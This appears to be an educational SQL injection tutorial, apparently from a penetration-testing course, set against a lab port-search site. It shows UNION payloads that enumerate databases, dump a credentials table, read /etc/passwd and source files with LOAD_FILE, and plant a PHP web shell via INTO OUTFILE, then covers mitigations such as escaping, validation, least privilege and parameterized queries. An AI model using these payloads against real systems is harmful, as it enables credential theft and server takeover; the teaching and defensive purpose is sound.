@@ -1,0 +1,482 @@
+Database Enumeration
+
+In the previous sections, we learned about different SQL queries in MySQL and SQL injections and how to use them. This section will put all of that to use and gather data from the database using SQL queries within SQL injections.
+MySQL Fingerprinting
+
+Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.
+
+As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.
+
+As we cover MySQL in this module, let us fingerprint MySQL databases. The following queries and their output will tell us that we are dealing with MySQL:
+Payload 	When to Use 	Expected Output 	Wrong Output
+SELECT @@version 	When we have full query output 	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' 	In MSSQL it returns MSSQL version. Error with other DBMS.
+SELECT POW(1,1) 	When we only have numeric output 	1 	Error with other DBMS
+SELECT SLEEP(5) 	Blind/No Output 	Delays page response for 5 seconds and returns 0. 	Will not delay response with other DBMS
+
+As we saw in the example from the previous section, when we tried @@version, it gave us:
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes 10.3.22-MariaDB-1ubuntu1, 3, and 4
+
+The output 10.3.22-MariaDB-1ubuntu1 means that we are dealing with a MariaDB DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.
+INFORMATION_SCHEMA Database
+
+To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
+
+    List of databases
+    List of tables within each database
+    List of columns within each table
+
+With the above information, we can form our SELECT statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the INFORMATION_SCHEMA Database.
+
+The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.
+
+So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
+Code: sql
+
+SELECT * FROM my_database.users;
+
+Similarly, we can look at tables present in the INFORMATION_SCHEMA Database.
+SCHEMATA
+
+To start our enumeration, we should find what databases are available on the DBMS. The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
+
+Let us first test this on a local database to see how the query is used:
+Database Enumeration
+
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+
+We see the ilfreight and dev databases.
+
+Note: The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
+
+Now, let's do the same using a UNION SQL injection, with the following payload:
+Code: sql
+
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include information_schema, ilfreight, dev, performance_schema, mysql, all with Port City 3 and Port Volume 4
+
+Once again, we see two databases, ilfreight and dev, apart from the default ones. Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the SELECT database() query. We can do this similarly to how we found the DBMS version in the previous section:
+Code: sql
+
+cn' UNION select 1,database(),2,3-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes ilfreight, 2, and 3
+
+We see that the database name is ilfreight. However, the other database (dev) looks interesting. So, let us try to retrieve the tables from it.
+TABLES
+
+Before we dump data from the dev database, we need to get a list of the tables to query them with a SELECT statement. To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
+
+The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the dev database:
+Code: sql
+
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+
+Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.
+Search interface with a text box containing 'cn' UNION select 1,table_n' and a button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include credentials, posts, framework, pages, all with Port City dev and Port Volume 4
+
+Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.
+
+We see four tables in the dev database, namely credentials, framework, pages, and posts. For example, the credentials table could contain sensitive information to look into it.
+COLUMNS
+
+To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this. As we did before, let us try this payload to find the column names in the credentials table:
+Code: sql
+
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+
+Search interface with a text box containing 'cn' UNION select 1,table_n' and a button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include username, password, all with Port City credentials and Port Volume dev
+
+The table has two columns named username and password. We can use this information and dump data from the table.
+Data
+
+Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:
+Code: sql
+
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+
+Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include admin, dev_admin, api_key, with corresponding Port City values as hashes and Port Volume 4
+
+We were able to get all the entries inthe credentials table, which contains sensitive information such as password hashes and an API key.
+
+Reading Files
+
+In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.
+Privileges
+
+Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.
+DB User
+
+First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
+Code: sql
+
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+Our UNION injection payload will be as follows:
+Code: sql
+
+cn' UNION SELECT 1, user(), 3, 4-- -
+
+or:
+Code: sql
+
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+
+Which tells us our current user, which in this case is root:
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4
+
+This is very promising, as a root user is likely to be a DBA, which gives us many privileges.
+User Privileges
+
+Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
+Code: sql
+
+SELECT super_priv FROM mysql.user
+
+Once again, we can use the following payload with the above query:
+Code: sql
+
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+
+If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
+Code: sql
+
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4
+
+The query returns Y, which means YES, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
+Code: sql
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+
+From here, we can add WHERE grantee="'root'@'localhost'" to only show our current user root privileges. Our payload would be:
+Code: sql
+
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+And we see all of the possible privileges given to our current user:
+Search interface with a text box containing 'cn' UNION SELECT 1, grant' and a button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include 'root'@'localhost' with Port City values like SELECT, INSERT, UPDATE, and Port Volume 4
+
+We see that the FILE privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.
+LOAD_FILE
+
+Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
+Code: sql
+
+SELECT LOAD_FILE('/etc/passwd');
+
+Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
+
+Similar to how we have been using a UNION injection, we can use the above query:
+Code: sql
+
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include user information like root:x:0:0:root:/root:/bin/bash and daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+We were able to successfully read the contents of the passwd file through the SQL injection. Unfortunately, this can be potentially used to leak the application source code as well.
+Another Example
+
+We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
+Code: sql
+
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume.
+
+However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting [Ctrl + U].
+
+PHP code snippet for querying a database. It checks if 'port_code' is set, constructs a SQL query to select from 'ports' where code matches, executes the query, and fetches results
+
+The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.
+
+Writing Files
+
+When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.
+Write File Privileges
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+    User with FILE privilege enabled
+    MySQL global secure_file_priv variable not enabled
+    Write access to the location we want to write to on the back-end server
+
+We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.
+secure_file_priv
+
+The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
+
+So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:
+Code: sql
+
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
+
+We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
+
+The final SQL query is the following:
+Code: sql
+
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+So, similar to other UNION injection queries, we can get the above query result with the following payload. Remember to add two more columns 1 & 4 as junk data to have a total of 4 columns':
+Code: sql
+
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes SECURE_FILE_PRIV, 3, and 4
+
+And the result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location.
+SELECT INTO OUTFILE
+
+Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the SELECT .. INTO OUTFILE statement. The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
+Writing Files
+
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+If we go to the back-end server and cat the file, we see that table's content:
+Writing Files
+
+Schlop@htb[/htb]$ cat /tmp/credentials
+
+1       admin   392037dbba51f692776d6cefb6dd546d
+2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
+
+It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
+Code: sql
+
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+When we cat the file, we see that text:
+Writing Files
+
+Schlop@htb[/htb]$ cat /tmp/test.txt
+
+this is a test
+
+Writing Files
+
+Schlop@htb[/htb]$ ls -la /tmp/test.txt
+
+-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
+
+As we can see above, the test.txt file was created successfully and is owned by the mysql user.
+
+Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+Writing Files through SQL Injection
+
+Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully! to the /var/www/html/proof.txt file, which we can then access on the web application:
+Code: sql
+
+select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+
+Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+
+The UNION injection payload would be as follows:
+Code: sql
+
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+Search interface with a text box and button labeled 'Search'. Below is an empty table with columns: Port Code, Port City, and Port Volume
+
+We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file proof.txt in the webroot, we see that it indeed exists:
+Text displaying: '1 file written successfully! 3 4'
+
+Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.
+Writing a Web Shell
+
+Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
+Code: php
+
+<?php system($_REQUEST[0]); ?>
+
+We can reuse our previous UNION injection payload, and change the string to the above, and the file name to shell.php:
+Code: sql
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+', “ “, “ “ into outfile '/var/www/html/shell.php'-- -'>
+Search interface with a text box and button labeled 'Search'. Below is an empty table with columns: Port Code, Port City, and Port Volume
+
+Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL:
+Text displaying: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+The output of the id command confirms that we have code execution and are running as the www-data user.
+
+Mitigating SQL Injection
+
+We have learned about SQL injections, why they occur, and how we can exploit them. We should also learn how to avoid these types of vulnerabilities in our code and patch them when found. Let's look at some examples of how SQL Injection can be mitigated.
+Input Sanitization
+
+Here's the snippet of the code from the authentication bypass section we discussed earlier:
+Code: php
+
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+  echo "Executing query: " . $query . "<br /><br />";
+
+  if (!mysqli_query($conn ,$query))
+  {
+          die('Error: ' . mysqli_error($conn));
+  }
+
+  $result = mysqli_query($conn, $query);
+  $row = mysqli_fetch_array($result);
+<SNIP>
+
+As we can see, the script takes in the username and password from the POST request and passes it to the query directly. This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. This function escapes characters such as ' and ", so they don't hold any special meaning.
+Code: php
+
+<SNIP>
+$username = mysqli_real_escape_string($conn, $_POST['username']);
+$password = mysqli_real_escape_string($conn, $_POST['password']);
+
+$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
+echo "Executing query: " . $query . "<br /><br />";
+<SNIP>
+
+The snippet above shows how the function can be used.
+
+Admin panel with SQL injection query and 'Login failed!' message.
+
+As expected, the injection no longer works due to escaping the single quotes. A similar example is the pg_escape_string() which used to escape PostgreSQL queries.
+Input Validation
+
+User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of ...@email.com, and so on.
+
+Consider the following code snippet from the ports page, which we used UNION injections on:
+Code: php
+
+<?php
+if (isset($_GET["port_code"])) {
+	$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
+	$result = pg_query($conn,$q);
+
+	if (!$result)
+	{
+   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
+	}
+<SNIP>
+?>
+
+We see the GET parameter port_code being used in the query directly. It's already known that a port code consists only of letters or spaces. We can restrict the user input to only these characters, which will prevent the injection of queries. A regular expression can be used for validating the input:
+Code: php
+
+<SNIP>
+$pattern = "/^[A-Za-z\s]+$/";
+$code = $_GET["port_code"];
+
+if(!preg_match($pattern, $code)) {
+  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
+}
+
+$q = "Select * from ports where port_code ilike '%" . $code . "%'";
+<SNIP>
+
+The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.
+Search for a port with fields for Port Code, Port City, and Port Volume.
+
+We can test the following injection:
+Code: sql
+
+'; SELECT 1,2,3,4-- -
+
+Search for a port with fields for Port Code, Port City, and Port Volume.
+
+As seen in the images above, input with injected queries was rejected by the server.
+User Privileges
+
+As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.
+
+Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.
+Mitigating SQL Injection
+
+MariaDB [(none)]> CREATE USER 'reader'@'localhost';
+
+Query OK, 0 rows affected (0.002 sec)
+
+
+MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
+
+Query OK, 0 rows affected (0.000 sec)
+
+The commands above add a new MariaDB user named reader who is granted only SELECT privileges on the ports table. We can verify the permissions for this user by logging in:
+Mitigating SQL Injection
+
+Schlop@htb[/htb]$ mysql -u reader -p
+
+MariaDB [(none)]> use ilfreight;
+MariaDB [ilfreight]> SHOW TABLES;
+
++---------------------+
+| Tables_in_ilfreight |
++---------------------+
+| ports               |
++---------------------+
+1 row in set (0.000 sec)
+
+
+MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| information_schema |
+| ilfreight          |
++--------------------+
+2 rows in set (0.000 sec)
+
+
+MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
+ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
+
+The snippet above confirms that the reader user cannot query other tables in the ilfreight database. The user only has access to the ports table that is needed by the application.
+Web Application Firewall
+
+Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.
+Parameterized Queries
+
+Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
+
+Consider the following modified code:
+Code: php
+
+<SNIP>
+  $username = $_POST['username'];
+  $password = $_POST['password'];
+
+  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
+  $stmt = mysqli_prepare($conn, $query);
+  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
+  mysqli_stmt_execute($stmt);
+  $result = mysqli_stmt_get_result($stmt);
+
+  $row = mysqli_fetch_array($result);
+  mysqli_stmt_close($stmt);
+<SNIP>
+
+The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.
+Conclusion
+
+The list above is not exhaustive, and it could still be possible to exploit SQL injection based on the application logic. The code examples shown are based on PHP, but the logic applies across all common languages and libraries
